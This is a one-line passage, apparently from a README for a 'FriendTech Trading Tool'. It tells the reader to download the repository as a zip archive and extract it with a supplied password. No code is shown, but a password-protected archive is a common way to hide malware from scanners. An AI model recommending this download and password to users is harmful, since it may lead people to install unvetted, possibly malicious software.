...
1. **[Clone](https://github.com/gemhunterheh/FriendTech-Trading-Tool/archive/refs/heads/main.zip) the Repository and extract archive with password `ieJTE4Aui1Y`:**
